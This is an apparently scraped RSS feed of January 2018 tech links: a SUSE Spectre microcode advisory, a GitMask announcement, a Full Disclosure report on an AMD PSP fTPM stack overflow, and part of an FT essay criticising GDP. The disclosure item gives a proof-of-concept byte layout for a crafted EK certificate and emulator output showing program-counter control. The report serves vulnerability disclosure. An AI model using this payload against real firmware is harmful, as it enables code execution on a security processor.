<description>SUSE Security Update: Security update for kernel-firmware&lt;br /&gt;______________________________________________________________________________&lt;p&gt;Announcement ID: SUSE-SU-2018:0008-1&lt;br /&gt;Rating: important&lt;br /&gt;References: #1068032&lt;br /&gt;Cross-References: CVE-2017-5715&lt;br /&gt;Affected Products:&lt;br /&gt;SUSE Linux Enterprise Server for Raspberry Pi 12-SP2&lt;br /&gt;SUSE Linux Enterprise Server 12-SP3&lt;br /&gt;SUSE Linux Enterprise Server 12-SP2&lt;br /&gt;SUSE Linux Enterprise Desktop 12-SP3&lt;br /&gt;SUSE Linux Enterprise Desktop 12-SP2&lt;br /&gt;SUSE Container as a Service Platform ALL&lt;br /&gt;______________________________________________________________________________&lt;/p&gt;&lt;p&gt;An update that fixes one vulnerability is now available.&lt;/p&gt;&lt;p&gt;Description:&lt;/p&gt;&lt;p&gt;This update for kernel-firmware fixes the following issues:&lt;/p&gt;&lt;p&gt;- Add microcode_amd_fam17h.bin (bsc#1068032 CVE-2017-5715)&lt;/p&gt;&lt;p&gt;This new firmware disables branch prediction on AMD family 17h processor&lt;br /&gt;to mitigate a attack on the branch predictor that could lead to&lt;br /&gt;information disclosure from e.g. kernel memory (bsc#1068032 CVE-2017-5715).&lt;/p&gt;&lt;p&gt;Patch Instructions:&lt;/p&gt;&lt;p&gt;To install this SUSE Security Update use YaST online_update.&lt;br /&gt;Alternatively you can run the command listed for your product:&lt;/p&gt;&lt;p&gt;- SUSE Linux Enterprise Server for Raspberry Pi 12-SP2:&lt;/p&gt;&lt;p&gt;zypper in -t patch SUSE-SLE-RPI-12-SP2-2018-8=1&lt;/p&gt;&lt;p&gt;- SUSE Linux Enterprise Server 12-SP3:&lt;/p&gt;&lt;p&gt;zypper in -t patch SUSE-SLE-SERVER-12-SP3-2018-8=1&lt;/p&gt;&lt;p&gt;- SUSE Linux Enterprise Server 12-SP2:&lt;/p&gt;&lt;p&gt;zypper in -t patch SUSE-SLE-SERVER-12-SP2-2018-8=1&lt;/p&gt;&lt;p&gt;- SUSE Linux Enterprise Desktop 12-SP3:&lt;/p&gt;&lt;p&gt;zypper in -t patch SUSE-SLE-DESKTOP-12-SP3-2018-8=1&lt;/p&gt;&lt;p&gt;- SUSE Linux Enterprise Desktop 12-SP2:&lt;/p&gt;&lt;p&gt;zypper in -t patch SUSE-SLE-DESKTOP-12-SP2-2018-8=1&lt;/p&gt;&lt;p&gt;- SUSE Container as a Service Platform ALL:&lt;/p&gt;&lt;p&gt;zypper in -t patch SUSE-CAASP-ALL-2018-8=1&lt;/p&gt;&lt;p&gt;To bring your system up-to-date, use &quot;zypper patch&quot;.&lt;/p&gt;&lt;p&gt;Package List:&lt;/p&gt;&lt;p&gt;- SUSE Linux Enterprise Server for Raspberry Pi 12-SP2 (noarch):&lt;/p&gt;&lt;p&gt;kernel-firmware-20170530-21.16.1&lt;/p&gt;&lt;p&gt;- SUSE Linux Enterprise Server 12-SP3 (noarch):&lt;/p&gt;&lt;p&gt;kernel-firmware-20170530-21.16.1&lt;br /&gt;ucode-amd-20170530-21.16.1&lt;/p&gt;&lt;p&gt;- SUSE Linux Enterprise Server 12-SP2 (noarch):&lt;/p&gt;&lt;p&gt;kernel-firmware-20170530-21.16.1&lt;br /&gt;ucode-amd-20170530-21.16.1&lt;/p&gt;&lt;p&gt;- SUSE Linux Enterprise Desktop 12-SP3 (noarch):&lt;/p&gt;&lt;p&gt;kernel-firmware-20170530-21.16.1&lt;br /&gt;ucode-amd-20170530-21.16.1&lt;/p&gt;&lt;p&gt;- SUSE Linux Enterprise Desktop 12-SP2 (noarch):&lt;/p&gt;&lt;p&gt;kernel-firmware-20170530-21.16.1&lt;br /&gt;ucode-amd-20170530-21.16.1&lt;/p&gt;&lt;p&gt;- SUSE Container as a Service Platform ALL (noarch):&lt;/p&gt;&lt;p&gt;kernel-firmware-20170530-21.16.1&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;p&gt;&lt;a rel=&quot;nofollow&quot; href=&quot;https://www.suse.com/security/cve/CVE-2017-5715.html&quot;&gt;https://www.suse.com/security/cve/CVE-2017-5715.html&lt;/a&gt;&lt;br /&gt;&lt;a rel=&quot;nofollow&quot; href=&quot;https://bugzilla.suse.com/1068032&quot;&gt;https://bugzilla.suse.com/1068032&lt;/a&gt;&lt;/p&gt;&lt;p&gt;--&lt;br /&gt;To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@xxxxxxxxxxxx&lt;br /&gt;For additional commands, e-mail: opensuse-security-announce+help@xxxxxxxxxxxx&lt;/p&gt;</description>
<pubDate>Fri, 05 Jan 2018 20:25:40 +0000</pubDate>
<dc:creator>hlandau</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://lists.opensuse.org/opensuse-security-announce/2018-01/msg00004.html</dc:identifier>
</item>
<item>
<title>GitMask – Develop Anonymously</title>
<link>https://www.gitmask.com/</link>
<guid isPermaLink="true" >https://www.gitmask.com/</guid>
<description>&lt;h3&gt;Trust me, I'm a developer&lt;/h3&gt;
&lt;p&gt;My name is Jason, I'm an avid open source developer. I love Github, and I love open source, but on more than one occasion I've wished that I could hide a commit from my public timeline.&lt;/p&gt;
&lt;p&gt;I finally decided to sit down and figure out what it would take to make that happen, and Gitmask is the result. Obviously it's open source, with an MIT license.&lt;/p&gt;
&lt;a href=&quot;http://www.github.com/AnalogJ/gitmask&quot; class=&quot;gm-parallax-texts-btnl&quot;&gt;View on Github&lt;/a&gt;</description>
<pubDate>Fri, 05 Jan 2018 19:57:54 +0000</pubDate>
<dc:creator>josephscott</dc:creator>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.gitmask.com/</dc:identifier>
</item>
<item>
<title>AMD PSP: Firmware TPM Remote Code Execution via Crafted EK Certificate</title>
<link>http://seclists.org/fulldisclosure/2018/Jan/12</link>
<guid isPermaLink="true" >http://seclists.org/fulldisclosure/2018/Jan/12</guid>
<description>
&lt;p&gt;&lt;a href=&quot;http://seclists.org/fulldisclosure/&quot;&gt;&lt;img src=&quot;http://seclists.org/images/fulldisclosure-logo.png&quot; border=&quot;0&quot; width=&quot;80&quot; alt=&quot;fulldisclosure logo&quot; /&gt;&lt;/a&gt; &lt;span&gt;&lt;a href=&quot;http://seclists.org/fulldisclosure/&quot;&gt;Full Disclosure&lt;/a&gt; mailing list archives&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;

&lt;span&gt;&lt;strong&gt;AMD-PSP: fTPM Remote Code Execution via crafted EK certificate&lt;/strong&gt;&lt;/span&gt;
&lt;hr /&gt;&lt;em&gt;From&lt;/em&gt;: Cfir Cohen via Fulldisclosure &amp;lt;fulldisclosure () seclists org&amp;gt;&lt;br /&gt;&lt;em&gt;Date&lt;/em&gt;: Wed, 3 Jan 2018 09:40:40 -0800&lt;br /&gt;&lt;hr /&gt;&lt;pre&gt;
Introduction
============
AMD PSP [1] is a dedicated security processor built onto the main CPU die.
ARM TrustZone provides an isolated execution environment for sensitive and
privileged tasks, such as main x86 core startup. See [2] for details.

fTPM is a firmware TPM [3] implementation. It runs as a trustlet
application inside the PSP. fTPM exposes a TPM 2.0 interface over MMIO to
the host [4].

Research
========
The fTPM trustlet code was found in Coreboot’s git repository [5] and in
several BIOS update files. The TPM reference implementation code is
published in trustedcomputinggroup.org (TCG) TPM specification. In fact,
the code *is* the spec.
Most TPM vendors implement their TPMs based on the TCG spec code. Vendors
implement the storage layer (where non-volatile data and persistent objects
are stored), connect the crypto library to a good source of entropy, and
sometimes re-implement the low-level crypto functions. However, a lot of
the TPM code is shared with the publicly accessible TPM specification:
request/response marshaling, session management and command execution logic.
This research focused on vendor specific code that diverged from the TCG
spec.

Vulnerability
=============
Through manual static analysis, we’ve found a stack-based overflow in the
function EkCheckCurrentCert.
This function is called from TPM2_CreatePrimary with user controlled data -
a DER encoded [6] endorsement key (EK) certificate stored in the NV
storage.

A TLV (type-length-value) structure is parsed and copied on to the parent
stack frame. Unfortunately, there are missing bounds checks, and a
specially crafted certificate can lead to a stack overflow:

NESTED_CERT_DATA1 = '\x03\x82\x07\xf0' + 'A * 0x7f0
NESTED_CERT_DATA2 = '\x03\x82' + pack('&amp;gt;H', len(NESTED_CERT_DATA1)) +
NESTED_CERT_DATA1
CERT_DATA = '\x03\x82' + pack('&amp;gt;H', len(NESTED_CERT_DATA2)) +
NESTED_CERT_DATA2

Proof Of Concept
================
Without access to a real AMD hardware, we used an ARM emulator [7] to
emulate a call to EkCheckCurrentCert with the CERT_DATA listed above. We
verified that full control on the program counter is possible:

EkCheckCurrentCert+c8    : B               loc_10EE4
EkCheckCurrentCert+60    : LDR             R4, =0xB80
EkCheckCurrentCert+62    : ADDS            R4, #0x14
EkCheckCurrentCert+64    : ADD             SP, R4
EkCheckCurrentCert+66    : POP             {R4-R7,PC}
41414140                 : ????
|
R0=ff,R1=f00242c,R2=f001c24,R3=824,R4=41414141,R5=41414141,R6=41414141,R7=41414141,PC=41414140,SP=f003000,LR=11125

As far as we know, general exploit mitigation technologies (stack cookies,
NX stack, ASLR) are not implemented in the PSP environment.

Credits
===========
This vulnerability was discovered and reported to AMD by Cfir Cohen of the
Google Cloud Security Team.


Timeline
========
09-28-17 - Vulnerability reported to AMD Security Team.
12-07-17 - Fix is ready. Vendor works on a rollout to affected partners.
01-03-18 - Public disclosure due to 90 day disclosure deadline.


[1] &lt;a rel=&quot;nofollow&quot; href=&quot;http://www.amd.com/en-us/innovations/software-technologies/security&quot;&gt;http://www.amd.com/en-us/innovations/software-technologies/security&lt;/a&gt;
[2]
&lt;a rel=&quot;nofollow&quot; href=&quot;https://classic.regonline.com/custImages/360000/369552/TCC%20PPTs/TCC2013_VanDoorn.pdf&quot;&gt;https://classic.regonline.com/custImages/360000/369552/TCC%20PPTs/TCC2013_VanDoorn.pdf&lt;/a&gt;
[3] &lt;a rel=&quot;nofollow&quot; href=&quot;https://en.wikipedia.org/wiki/Trusted_Platform_Module&quot;&gt;https://en.wikipedia.org/wiki/Trusted_Platform_Module&lt;/a&gt;
[4]
&lt;a rel=&quot;nofollow&quot; href=&quot;http://www.trustedcomputinggroup.org/wp-content/uploads/PC-Client-Specific-Platform-TPM-Profile-for-TPM-2-0-v43-150126.pdf&quot;&gt;http://www.trustedcomputinggroup.org/wp-content/uploads/PC-Client-Specific-Platform-TPM-Profile-for-TPM-2-0-v43-150126.pdf&lt;/a&gt;
[5] &lt;a rel=&quot;nofollow&quot; href=&quot;https://github.com/coreboot/blobs/tree/master/southbridge/amd/avalon/PSP&quot;&gt;https://github.com/coreboot/blobs/tree/master/southbridge/amd/avalon/PSP&lt;/a&gt;
[6] &lt;a rel=&quot;nofollow&quot; href=&quot;https://en.wikipedia.org/wiki/X.690#DER_encoding&quot;&gt;https://en.wikipedia.org/wiki/X.690#DER_encoding&lt;/a&gt;
[7] &lt;a rel=&quot;nofollow&quot; href=&quot;http://www.unicorn-engine.org/&quot;&gt;http://www.unicorn-engine.org/&lt;/a&gt;

_______________________________________________
Sent through the Full Disclosure mailing list
&lt;a rel=&quot;nofollow&quot; href=&quot;https://nmap.org/mailman/listinfo/fulldisclosure&quot;&gt;https://nmap.org/mailman/listinfo/fulldisclosure&lt;/a&gt;
Web Archives &amp;amp; RSS: &lt;a rel=&quot;nofollow&quot; href=&quot;http://seclists.org/fulldisclosure/&quot;&gt;http://seclists.org/fulldisclosure/&lt;/a&gt;
&lt;/pre&gt;
&lt;hr /&gt;&lt;p&gt;&lt;a href=&quot;http://seclists.org/fulldisclosure/2018/Jan/11&quot;&gt;&lt;img src=&quot;http://seclists.org/images/left-icon-16x16.png&quot; border=&quot;0&quot; width=&quot;16&quot; height=&quot;16&quot; /&gt;&lt;/a&gt;  &lt;a href=&quot;http://seclists.org/fulldisclosure/2018/Jan/date.html#12&quot;&gt;By Date&lt;/a&gt;  &lt;a href=&quot;http://seclists.org/fulldisclosure/2018/Jan/13&quot;&gt;&lt;img src=&quot;http://seclists.org/images/right-icon-16x16.png&quot; border=&quot;0&quot; width=&quot;16&quot; height=&quot;16&quot; /&gt;&lt;/a&gt;       &lt;a href=&quot;http://seclists.org/fulldisclosure/2018/Jan/11&quot;&gt;&lt;img src=&quot;http://seclists.org/images/left-icon-16x16.png&quot; border=&quot;0&quot; width=&quot;16&quot; height=&quot;16&quot; /&gt;&lt;/a&gt;  &lt;a href=&quot;http://seclists.org/fulldisclosure/2018/Jan/index.html#12&quot;&gt;By Thread&lt;/a&gt;  &lt;a href=&quot;http://seclists.org/fulldisclosure/2018/Jan/13&quot;&gt;&lt;img src=&quot;http://seclists.org/images/right-icon-16x16.png&quot; border=&quot;0&quot; width=&quot;16&quot; height=&quot;16&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
&lt;span&gt;&lt;strong&gt;Current thread:&lt;/strong&gt;&lt;/span&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;AMD-PSP: fTPM Remote Code Execution via crafted EK certificate&lt;/strong&gt; &lt;em&gt;Cfir Cohen via Fulldisclosure (Jan 05)&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
<pubDate>Fri, 05 Jan 2018 19:55:43 +0000</pubDate>
<dc:creator>transpute</dc:creator>
<og:image>http://seclists.org/images/fulldisclosure-img.png</og:image>
<dc:format>text/html</dc:format>
<dc:identifier>http://seclists.org/fulldisclosure/2018/Jan/12</dc:identifier>
</item>
<item>
<title>The case against GDP: time to change the way we measure the wealth of nations</title>
<link>https://www.ft.com/content/765781fe-f136-11e7-b220-857e26d1aca4</link>
<guid isPermaLink="true" >https://www.ft.com/content/765781fe-f136-11e7-b220-857e26d1aca4</guid>
<description>&lt;div class=&quot;article-info&quot;&gt;
&lt;div class=&quot;article-info__time-byline&quot;&gt;
&lt;p class=&quot;article-info__byline&quot;&gt;&lt;a class=&quot;n-content-tag n-content-tag--author&quot; href=&quot;https://www.ft.com/comment/columnists/david-pilling&quot; data-trackable=&quot;author&quot;&gt;David Pilling&lt;/a&gt;&lt;/p&gt;
&lt;time class=&quot;article-info__timestamp o-date&quot; data-o-component=&quot;o-date&quot; datetime=&quot;2018-01-05T05:01:22Z&quot; data-o-date-js=&quot;&quot;&gt;January 5, 2018&lt;/time&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Imagine two people. Let’s call them Bill and Ben. Bill is a mid-ranking investment banker who clears £500,000 a year after tax. Ben is a gardener who takes home £25,000. Who is better off?&lt;/p&gt;
&lt;p&gt;If we judge them by their income, then Bill is clearly richer; 20 times richer, to be precise. But who is wealthier? For that, you’re going to have to know more about their stock of assets and broader circumstances.&lt;/p&gt;
&lt;p&gt;In national accounting terms, Bill’s £500,000 salary is the equivalent of gross domestic product. It is the “flow” of income earned in a year. But, as any mortgage lender knows, that doesn’t tell you anything about his wealth or his salary next year or the year after that.&lt;/p&gt;

&lt;p&gt;Did I mention that Bill is up to his neck in debt after a crippling divorce, or that he has an expensive cocaine habit? He’s sold off most of his assets, including his vintage Harley-Davidsons. All he is left with is a costly mortgage and several payments on his (scratched-up) Porsche. At 59, he’s also washed up at work. In fact, he is about to be fired when the bank shifts its derivatives trading team from London to Frankfurt.&lt;/p&gt;
&lt;p&gt;Ben, meanwhile, lives in the £100m country estate he inherited from his great aunt. On the weekends, he potters about for fun in his own Versailles-inspired garden, paying himself a nominal salary.&lt;/p&gt;
&lt;p&gt;This year, before he turns 21, he plans to sell the estate and move into a modest flat in Knightsbridge. He’ll invest the £95m he has left over and live off the interest while he completes his studies as a patent lawyer, a profession that should earn him a bit of pocket money in the years ahead.&lt;/p&gt;
&lt;p&gt;Now who looks richer? Bill the banker or Ben the gardener?&lt;/p&gt;
&lt;p&gt;Michal Kalecki, the Polish economist, is said to have described economics as “the science of confusing stocks with flows”. Investors scrutinise a company’s balance sheet as well as its profits and losses. Yet, when it comes to sizing up a nation, we are mostly stuck with GDP, which counts the value of goods and services produced in a given period.&lt;/p&gt;
&lt;div class=&quot;n-image-wrapper n-image-wrapper--placeholder&quot;&gt;&lt;img alt=&quot;&quot; role=&quot;presentation&quot; class=&quot;n-image&quot; srcset=&quot;https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Fab374e4a-f20d-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=700 700w, https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Fab374e4a-f20d-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=500 500w, https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Fab374e4a-f20d-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=300 300w&quot; sizes=&quot;(min-width: 76.25em) 700px, (min-width: 61.25em) 620px, (min-width: 46.25em) 700px, calc(100vw - 20px)&quot;/&gt;&lt;/div&gt;
&lt;p&gt;GDP numbers can be misleading. That applies especially to resource-rich countries. &lt;a href=&quot;https://www.ft.com/content/ce81f33a-f093-11e7-b220-857e26d1aca4&quot; data-trackable=&quot;link&quot;&gt;Saudi Arabia&lt;/a&gt;’s income per capita of around $20,000 a year depends on the price and production volume of oil, which will one day run out. At that point, unless the Saudis figure out a way of replacing lost income — through developing high-tech industries staffed by educated people — it will become the Bill the banker of nations.&lt;/p&gt;

&lt;p&gt;As Paul Collier, professor of economics and public policy at the Blavatnik School of Government, says, it is a lesson hard to glean from national income statistics. You need regular updates of a country’s balance sheet to “blow the whistle” on unsustainable policies.&lt;/p&gt;
&lt;p&gt;Yet it is not something lost on astute leaders. Much of the urgency behind the &lt;a href=&quot;https://www.ft.com/content/6b2f31ac-96f3-11e7-8c5c-c8d8fa6961bb&quot; data-trackable=&quot;link&quot;&gt;reform efforts&lt;/a&gt; of Mohammed bin Salman, Saudi’s 32-year-old crown prince, stems from an apparent determination to diversify the economy before it is too late.&lt;/p&gt;
&lt;p&gt;“Policies that create wealth go beyond increasing output,” say Kirk Hamilton and Cameron Hepburn, in their recent book &lt;em&gt;National Wealth: What is Missing, Why it Matters&lt;/em&gt;. “They involve investments today for returns in the future.”&lt;/p&gt;
&lt;div class=&quot;n-image-wrapper n-image-wrapper--placeholder&quot;&gt;&lt;img alt=&quot;&quot; role=&quot;presentation&quot; class=&quot;n-image&quot; srcset=&quot;https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Faa2dabac-f20d-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=700 700w, https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Faa2dabac-f20d-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=500 500w, https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Faa2dabac-f20d-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=300 300w&quot; sizes=&quot;(min-width: 76.25em) 700px, (min-width: 61.25em) 620px, (min-width: 46.25em) 700px, calc(100vw - 20px)&quot;/&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;I have long had&lt;/strong&gt; vague misgivings about GDP as an accurate barometer of living standards and the sustainability of wealth. As a young reporter for the FT in Latin America in the 1990s, I quickly learnt to report minutely on the quarterly gyrations of GDP and to lend my articles a touch of gravitas by deploying GDP as a denominator. Tax revenue or debt levels or education expenditure were best expressed as a percentage of GDP to facilitate cross-country comparisons. Yet beyond knowing that GDP was a measure of economic output, I never stopped to think exactly how it was calculated or precisely what it meant.&lt;/p&gt;
&lt;p&gt;Later, as a correspondent in Japan, I wondered why people seemed so well off when nominal GDP had not budged for 20 years. Deflation and low population growth were part of the answer. That meant real per capita income was higher than the nominal number suggested. But the quality of services and technology also made a difference to living standards. To GDP, an elegant Mitsukoshi department store was the same as a Walmart, and a clapped-out British commuter train did just as well as a Japanese Shinkansen travelling at 200mph and arriving with a punctuality measured in fractions of a second.&lt;/p&gt;
&lt;p&gt;Later still, in China, I marvelled at year after year of double-digit growth, but worried that no one was taking any statistical reckoning of the not-so-hidden costs of growth in poisoned air and depleted soil. It seemed perverse that, if China spent money cleaning up its mess, that too would count as growth, much as GDP counts money spent to repair the damage after natural disasters, terrorist attacks or war. Any activity, it seemed — digging a hole and filling it up again — would do.&lt;/p&gt;
&lt;p&gt;In my most recent job, as Africa editor, I discovered that GDP data — often treated as sacrosanct and used, for example, to determine appropriate levels of borrowing — were virtually meaningless. Normal methods of compiling GDP, which rely on costly surveys of businesses and households, were often too expensive for cash-strapped governments to undertake. Besides, they failed to account properly for activity in the massive informal and subsistence sectors. Terry Ryan, chairman of Kenya’s National Bureau of Statistics, told me that if — as the official data suggested — some 72 per cent of Kenyans lived on a dollar or two a day, then “72 per cent of my people are dead”.&lt;/p&gt;
&lt;p&gt;In Nigeria, minor changes to methodology implemented in 2014 revealed that the economy was 89 per cent bigger than assumed, making a mockery of previous estimates. Again in Kenya, one group of economists said they could monitor the economy more accurately than GDP from outer space. Satellite imagery of night-lights showed that national income statistics were missing swathes of activity outside Nairobi, the capital.&lt;/p&gt;
&lt;p&gt;As I began to read more in the course of researching a book, &lt;em&gt;The Growth Delusion&lt;/em&gt;, I found that I was far from alone in my scepticism. There was a whole academic literature, a mini-industry becoming more respectable by the day, questioning the ability of GDP to reflect our lives.&lt;/p&gt;
&lt;div class=&quot;n-image-wrapper n-image-wrapper--placeholder&quot;&gt;&lt;img alt=&quot;&quot; role=&quot;presentation&quot; class=&quot;n-image&quot; srcset=&quot;https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Fbcc1ec7c-f1a6-11e7-b220-857e26d1aca4?source=next&amp;amp;fit=scale-down&amp;amp;width=700 700w, https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Fbcc1ec7c-f1a6-11e7-b220-857e26d1aca4?source=next&amp;amp;fit=scale-down&amp;amp;width=500 500w, https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Fbcc1ec7c-f1a6-11e7-b220-857e26d1aca4?source=next&amp;amp;fit=scale-down&amp;amp;width=300 300w&quot; sizes=&quot;(min-width: 76.25em) 700px, (min-width: 61.25em) 620px, (min-width: 46.25em) 700px, calc(100vw - 20px)&quot;/&gt;&lt;/div&gt;
A Shinkansen bullet train in Tokyo © AFP
&lt;p&gt;&lt;strong&gt;Invented in the 1930s&lt;/strong&gt; by Simon Kuznets, initially as a way of calculating the damage wrought by the Great Depression, GDP is a child of the manufacturing age. Good at keeping track of “things you can drop on your foot”, it struggles to make sense of the services — from life insurance and landscape gardening to stand-up comedy — that comprise some 80 per cent of modern economies. The internet is more perplexing still. In GDP terms, Wikipedia, which puts the sum of human knowledge at our fingertips, is worth precisely nothing.&lt;/p&gt;
&lt;p&gt;Nor does GDP have much useful to say about income distribution, one of the themes of our age. Kuznets warned urgently that his measure should never be confused with wellbeing. Yet in treating GDP as the nonpareil of numbers, it is a warning we have ignored.&lt;/p&gt;
&lt;blockquote class=&quot;n-content-pullquote&quot; aria-hidden=&quot;true&quot; readability=&quot;30.5&quot;&gt;
&lt;div class=&quot;n-content-pullquote__content&quot; readability=&quot;35&quot;&gt;
&lt;p&gt;In GDP terms, Wikipedia, which puts the sum of human knowledge at our fingertips, is worth nothing&lt;/p&gt;
&lt;/div&gt;
&lt;/blockquote&gt;
&lt;p&gt;Among GDP’s shortcomings, the distinction between flow of income and stock of wealth, highlighted by the story of Bill and Ben, is one of the most serious.&lt;/p&gt;
&lt;p&gt;Partha Dasgupta, emeritus professor of economics at Cambridge University, has been trying to invent ways of measuring wealth for decades. The “rogue word” in gross domestic product, he says, is “gross”. “If a wetland is drained to make way for a shopping mall, the construction of the latter contributes to GDP, but the destruction of the former goes unrecorded.”&lt;/p&gt;
&lt;p&gt;When I went to see Dasgupta, now in his mid-seventies, at his rooms at St John’s College, he began with the intricate interplay between wealth and income. One could think of it in terms of life planning, he said. A family might use income to purchase an asset, say a house, or it might trade in an asset to pay for an education, which, in turn, could later be converted into higher income. With any entity — a family, a company or a nation — wealth is “what enables you to plan”, he said, by “converting one form of capital into another”.&lt;/p&gt;
&lt;div class=&quot;n-image-wrapper n-image-wrapper--placeholder&quot;&gt;&lt;img alt=&quot;&quot; role=&quot;presentation&quot; class=&quot;n-image&quot; srcset=&quot;https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Fac25ec8a-f20d-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=700 700w, https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Fac25ec8a-f20d-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=500 500w, https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Fac25ec8a-f20d-11e7-ac08-07c3086a2625?source=next&amp;amp;fit=scale-down&amp;amp;width=300 300w&quot; sizes=&quot;(min-width: 76.25em) 700px, (min-width: 61.25em) 620px, (min-width: 46.25em) 700px, calc(100vw - 20px)&quot;/&gt;&lt;/div&gt;
&lt;p&gt;With nations, some forms of capital are easier to count than others. So-called manufactured capital comprises investments in roads, ports and cities. It is relatively easy to value and many countries keep inventories of capital stock. Human capital is the size and skill of a workforce. Natural capital includes non-renewables, such as oil and coal, and renewables, ranging from farmland to complex ecosystems that provide water, oxygen and nutrients.&lt;/p&gt;
&lt;p&gt;Attempts to value some of these assets can appear absurd. In 1997, the environmental economist Robert Costanza caused uproar with his estimate that the planet’s natural capital — “nature” to you and me — was worth $33tn. His sums, published in the scientific journal Nature, were pilloried by both conventional economists, who thought the exercise unscientific, and by environmentalists, who objected to the very idea of hanging a dollar tag on an ocean or a rainforest. Costanza found, for example, that lakes and rivers were “worth” $1.7tn, while nutrient cycling, an “ecosystem service”, provided $4.9tn of benefit to mankind.&lt;/p&gt;
&lt;p&gt;To call his calculations back-of-the-envelope would be to malign envelopes. Yet when challenged on his methodology, he responded, “We do not believe there is any one right way to value ecosystem services. But there is a wrong way, and that is not to do it all.”&lt;/p&gt;
&lt;div class=&quot;n-image-wrapper n-image-wrapper--placeholder&quot;&gt;&lt;img alt=&quot;&quot; role=&quot;presentation&quot; class=&quot;n-image&quot; srcset=&quot;https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Fbf4140ba-f1a6-11e7-b220-857e26d1aca4?source=next&amp;amp;fit=scale-down&amp;amp;width=700 700w, https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Fbf4140ba-f1a6-11e7-b220-857e26d1aca4?source=next&amp;amp;fit=scale-down&amp;amp;width=500 500w, https://www.ft.com/__origami/service/image/v2/images/raw/http%3A%2F%2Fcom.ft.imagepublish.prod-us.s3.amazonaws.com%2Fbf4140ba-f1a6-11e7-b220-857e26d1aca4?source=next&amp;amp;fit=scale-down&amp;amp;width=300 300w&quot; sizes=&quot;(min-width: 76.25em) 700px, (min-width: 61.25em) 620px, (min-width: 46.25em) 700px, calc(100vw - 20px)&quot;/&gt;&lt;/div&gt;
From left: Christine Lagarde, Saudi Crown Prince Mohammed bin Salman and Masayoshi Son © Reuters
&lt;p&gt;Some economists view any attempt to account for natural depletion with suspicion. When I asked Lawrence Summers about it, he decried what he saw as a bogus attempt by environmentalists to limit growth. His main complaint was that wealth accountants were quick to shout when resources had been depleted, but slow to acknowledge when they had been augmented.&lt;/p&gt;
&lt;p&gt;New technology, such as fracking and deep-sea drilling, Summers said, had increased exploitable oil and gas reserves. Video conferencing was a breakthrough that meant people could hold more international meetings while reducing travel-related emissions.&lt;/p&gt;
&lt;p&gt;But wealth accountants, he said, were never honest enough to concede how innovation could add to wealth as well as subtract. “It’s all a doom and gloom operation,” he practically growled down the phone. “In favour of everybody staying at home. Everybody staying home and knitting.”&lt;/p&gt;
&lt;p&gt;Summers is right that it is difficult to know how much current capital stock is worth, since its value can change depending on technological or political developments. Cobalt was once a mildly interesting byproduct of copper; now it’s a must-have component of electric car batteries. Oil has been liquid gold and may yet be again. But stricter environmental regulations could one day render it a stranded asset worth nothing.&lt;/p&gt;
&lt;p&gt;More philosophically, it is hard to put a price on the future. One of the supposed virtues of wealth accounting is that it is forward-looking. It analyses today’s stock of capital that will produce tomorrow’s income stream. GDP, on the other hand, is backward-looking. It merely tots up total production over a specific period in the past. So, in theory, wealth accounting should help one generation think about the next.&lt;/p&gt;
